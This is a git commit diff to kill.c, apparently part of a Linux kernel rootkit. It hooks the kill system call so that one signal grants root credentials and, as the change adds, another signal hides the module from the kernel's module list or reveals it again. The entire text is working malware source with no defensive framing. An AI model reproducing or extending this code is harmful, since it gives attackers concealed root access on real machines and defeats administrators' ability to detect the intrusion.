44dcaaf2ac1e0408dffb4faa60899055c16a77d1
J. O. Makar <jomakar@gmail.com>
2020-11-09 20:43:33 -0500

    kill sig=63 to hide module

--- kill.c
+++ kill.c
@@ -3,6 +3,9 @@
 asmlinkage int (*kill_orig)(struct pt_regs *);
 
 asmlinkage int kill_hook(struct pt_regs *regs) {
+    static int hidden = 0;
+    static struct list_head *prev_module;
+
     int sig = regs->si;
 
     if (sig == 64) {
@@ -19,6 +22,20 @@ asmlinkage int kill_hook(struct pt_regs *regs) {
 
                 commit_creds(root);
             }
+        }
+
+        return 0;
+
+    } else if (sig == 63) {
+        printk(KERN_INFO "toggle module presence");
+
+        if (hidden == 0) {
+            prev_module = THIS_MODULE->list.prev;
+            list_del(&THIS_MODULE->list);
+            hidden = 1;
+        } else {
+            list_add(&THIS_MODULE->list, prev_module);
+            hidden = 0;
         }
 
         return 0;
